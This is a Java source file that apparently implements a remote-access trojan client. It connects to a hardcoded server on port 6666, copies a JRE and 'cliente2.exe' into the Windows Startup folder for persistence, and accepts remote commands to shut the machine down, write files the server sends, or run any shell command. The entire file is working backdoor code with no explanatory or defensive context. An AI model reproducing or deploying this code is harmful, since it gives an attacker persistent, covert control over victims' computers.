import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.stream.Stream;


public class main {
    static Socket connection = null;
    private static String serverHost="192.168.1.71";
    public static void main(String[] args) throws Exception {
        waitingParse(serverHost, 6666);
        try {
            String homeDir = System.getProperty("user.home");
            homeDir = homeDir.replace("/","//");

            fileToStartup(homeDir);
            while (true) {
                handleConnection();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static byte[] getFileBytes(String filePath) throws Exception{
        Path path = Paths.get(filePath);
        return Files.readAllBytes(path);

    }
    public static void copyFolder(Path src, Path dest) throws IOException {
        try (Stream<Path> stream = Files.walk(src)) {
            stream.forEach(source -> copy(source, dest.resolve(src.relativize(source))));
        }
    }
    private static void copy(Path source, Path dest) {
        try {
            Files.copy(source, dest, StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            throw new RuntimeException(e.getMessage(), e);
        }
    }
    public static void saveFile(byte[] bytes,String filePath) throws Exception{
        File file = new File(filePath);
        OutputStream outputStream = new FileOutputStream(file);
        outputStream.write(bytes);
        outputStream.close();
    }
    public static void fileToStartup(String homeDir){
        try{

            Path srcDir = Paths.get("F:\\jre");
            String destination = homeDir+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jre";
            Path destDir = Paths.get(destination);
            String file = homeDir+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cliente2.exe";
            copyFolder(srcDir,destDir);
            byte[] arr = getFileBytes("F:\\cliente2.exe");
            saveFile(arr,file);
        }catch(Exception e){
            System.out.println(e);
        }
    }

    public static void waitingParse(String server, int port) {
        try {
            connection = new Socket(server, port);
        } catch (Exception ignored) {
            waitingParse(server, port);
        }
    }

    public static void handleConnection() {
        while (true) {
            try {
                ObjectInputStream data = new ObjectInputStream(connection.getInputStream());
                String method = data.readUTF();
                System.out.println("[+]Command " + method + " Received");
                switch (method) {
                    case "shutdown":
                        Runtime runtime = Runtime.getRuntime();
                        Process proc = runtime.exec("shutdown -s -t 0");
                        data.close();
                        System.exit(0);
                        break;
                    case "transfer":
                        byte[] file_byte = (byte[]) data.readObject();
                        String fileName = data.readUTF();
                        File fileCreate = new File(fileName);
                        OutputStream outputStream = new FileOutputStream(fileCreate);
                        outputStream.write(file_byte);
                        outputStream.close();
                        break;
                    case "cmd":
                        String command = data.readUTF();
                        Process p = Runtime.getRuntime().exec(command);
                        break;
                    case "powershell":
                        break;
                    default:
                }
            } catch (Exception ignored) {
            }
        }
    }
}